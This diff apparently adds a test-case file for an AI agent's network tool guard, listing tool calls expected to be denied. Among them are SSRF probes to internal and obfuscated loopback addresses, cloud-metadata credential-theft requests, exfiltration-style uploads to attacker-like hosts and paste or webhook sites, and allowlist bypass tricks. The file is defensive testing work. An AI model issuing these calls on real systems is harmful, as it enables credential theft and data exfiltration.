@@ -1,0 +1,43 @@
+{"tool": "http_request", "args": {"url": "http://10.0.0.5:8080/admin"}, "expect": "deny", "note": "internal address"}
+{"tool": "requests_get", "args": {"url": "http://192.168.1.1/"}, "expect": "deny", "note": "internal address"}
+{"tool": "fetch", "args": {"url": "http://172.16.0.10/status"}, "expect": "deny", "note": "internal address"}
+{"tool": "mcp:fetch/fetch", "args": {"url": "http://127.0.0.1:9200/_cat/indices"}, "expect": "deny", "note": "internal address"}
+{"tool": "http_get", "args": {"url": "http://localhost:6379/"}, "expect": "deny", "note": "internal address"}
+{"tool": "web_fetch", "args": {"url": "http://[::1]:8000/"}, "expect": "deny", "note": "internal address"}
+{"tool": "http_request", "args": {"url": "http://0.0.0.0:5000/debug"}, "expect": "deny", "note": "internal address"}
+{"tool": "requests_get", "args": {"url": "http://2130706433/"}, "expect": "deny", "note": "internal address"}
+{"tool": "fetch", "args": {"url": "http://0x7f000001/"}, "expect": "deny", "note": "internal address"}
+{"tool": "mcp:fetch/fetch", "args": {"url": "http://0177.0.0.1/"}, "expect": "deny", "note": "internal address"}
+{"tool": "http_get", "args": {"url": "http://redis.default.svc.cluster.local:6379/"}, "expect": "deny", "note": "internal address"}
+{"tool": "web_fetch", "args": {"url": "http://db.internal/"}, "expect": "deny", "note": "internal address"}
+{"tool": "http_request", "args": {"url": "http://printer.local/"}, "expect": "deny", "note": "internal address"}
+{"tool": "requests_get", "args": {"url": "http://100.64.0.1/"}, "expect": "deny", "note": "internal address"}
+{"tool": "fetch", "args": {"url": "http://[fd12:3456::1]/"}, "expect": "deny", "note": "internal address"}
+{"tool": "mcp:fetch/fetch", "args": {"url": "http://[fe80::1]/"}, "expect": "deny", "note": "internal address"}
+{"tool": "http_get", "args": {"url": "http://[::ffff:127.0.0.1]/"}, "expect": "deny", "note": "internal address"}
+{"tool": "web_fetch", "args": {"url": "http://0/"}, "expect": "deny", "note": "internal address"}
+{"tool": "http_request", "args": {"url": "https://grafana.corp/api/dashboards"}, "expect": "deny", "note": "internal address"}
+{"tool": "requests_get", "args": {"url": "http://admin.localhost/"}, "expect": "deny", "note": "internal address"}
+{"tool": "fetch", "args": {"url": "http://LOCALHOST:3000/"}, "expect": "deny", "note": "internal address"}
+{"tool": "mcp:fetch/fetch", "args": {"url": "http://172.31.255.254/"}, "expect": "deny", "note": "internal address"}
+{"tool": "http_get", "args": {"url": "http://10.1.2.3./"}, "expect": "deny", "note": "internal address"}
+{"tool": "web_fetch", "args": {"url": "http://user@10.0.0.1/"}, "expect": "deny", "note": "internal address"}
+{"tool": "http_request", "args": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}, "expect": "deny", "note": "cloud metadata service"}
+{"tool": "requests_get", "args": {"url": "http://[fd00:ec2::254]/latest/api/token"}, "expect": "deny", "note": "cloud metadata service"}
+{"tool": "fetch", "args": {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}, "expect": "deny", "note": "cloud metadata service"}
+{"tool": "mcp:fetch/fetch", "args": {"url": "http://169.254.170.2/v2/credentials/abc"}, "expect": "deny", "note": "cloud metadata service"}
+{"tool": "http_get", "args": {"url": "http://100.100.100.200/latest/meta-data/"}, "expect": "deny", "note": "cloud metadata service"}
+{"tool": "web_fetch", "args": {"url": "http://2852039166/latest/meta-data/"}, "expect": "deny", "note": "cloud metadata service"}
+{"tool": "http_request", "args": {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"}, "expect": "deny", "note": "cloud metadata service"}
+{"tool": "http_request", "args": {"method": "POST", "url": "https://webhook.site/7f3a", "body": {"rows": [1, 2, 3]}}, "expect": "deny", "note": "POST to an outside host"}
+{"tool": "requests_post", "args": {"url": "https://pastebin.com/api/api_post.php", "data": {"api_paste_code": "customer list"}}, "expect": "deny", "note": "paste site"}
+{"tool": "http_request", "args": {"method": "PUT", "url": "https://files.attacker.example.net/upload", "body": "dump"}, "expect": "deny", "note": "PUT outside"}
+{"tool": "http_request", "args": {"method": "post", "url": "https://collector.example.org/c", "json": {"x": 1}}, "expect": "deny", "note": "lower-case method"}
+{"tool": "requests_put", "args": {"url": "https://transfer.sh/data.csv", "data": "id,email\n1,a@b.c"}, "expect": "deny", "note": "file drop"}
+{"tool": "requests_patch", "args": {"url": "https://api.unknown-saas.io/v1/records/1", "data": {"notes": "x"}}, "expect": "deny", "note": "PATCH outside"}
+{"tool": "http_post", "args": {"url": "https://hooks.zapier.com/hooks/catch/1/2", "body": "x"}, "expect": "deny", "note": "webhook outside"}
+{"tool": "http_request", "args": {"method": "POST", "url": "https://example.com.evil.net/x", "body": "x"}, "expect": "deny", "note": "allowlist suffix trick"}
+{"tool": "http_request", "args": {"method": "POST", "url": "https://api.example.com@evil.net/x", "body": "x"}, "expect": "deny", "note": "userinfo trick"}
+{"tool": "http_request", "args": {"method": "POST", "url": "https://evil.net/x", "body": {"url": "https://api.example.com/"}}, "expect": "deny", "note": "allowlisted url in body"}
+{"tool": "http_request", "args": {"method": "POST", "url": "http://api.example.com/x", "body": "x"}, "expect": "deny", "note": "allowlisted host over http"}
+{"tool": "requests_post", "args": {"url": "https://discord.com/api/webhooks/1/abc", "data": {"content": "export"}}, "expect": "deny", "note": "chat webhook"}
